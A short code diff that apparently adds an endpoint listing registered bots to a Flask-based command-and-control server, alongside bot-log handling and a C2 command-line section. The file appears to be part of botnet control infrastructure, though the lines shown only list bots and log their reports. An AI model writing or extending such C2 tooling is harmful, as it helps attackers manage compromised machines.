@@ -127,6 +127,10 @@ def receive_log(bot_id):
     logger.info(f"[BOT LOG - {bot_id}] {log_entry}")
     return jsonify({'status': 'ok'})
 
+@app.route('/api/bots')
+def get_bots():
+    return jsonify(bots)
+
 # --- C2 CLI ---
 def print_bots():
     print("--- Registered Bots ---")
